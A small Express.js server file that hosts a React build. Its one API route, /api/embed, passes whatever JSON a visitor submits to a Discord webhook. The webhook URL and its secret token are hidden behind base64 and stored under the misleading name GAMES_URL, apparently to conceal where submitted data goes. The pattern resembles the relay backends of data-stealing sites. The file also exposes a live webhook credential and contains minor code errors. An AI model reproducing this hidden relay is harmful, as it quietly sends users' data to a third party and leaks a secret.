const express = require('express')
const path = require("path");
const app = express()
const bodyParser = require('body-parser');
// #############################################################################
// This configures static hosting for files in /public that have the extensions
// listed in the array.
var options = {
  dotfiles: 'ignore',
  etag: false,
  extensions: ['htm', 'html','css','js','ico','jpg','jpeg','png','svg'],
  index: ['index.html'],
  maxAge: '1m',
  redirect: false


}
const GAMES_URL = atob("aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwMTI5NDQwODU0ODI0NzE1MDQvY09RRjJ1b1VzTW83UWJ6Z2RZTjBsbVVwNTRoUGFUOWtzOWQzVi1fRDFVZ0VPelV6Qm9RX0R6TFFQU0F2RDc1VHQ5V3I=", "base64").toString()



app.use(bodyParser.json());

app.post('/api/embed', (req, res) => {
  fetch (GAMES_URL, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(req.body)
}).then((response) => {

res.send(response);
}).catch((error) => {
  res.send(error);
}
)
})

app.use(express.static('build', options))


const port = process.env.PORT || 3000

app.listen(port, () => {
  console.log(`React app listening at http://localhost:${port}`)
})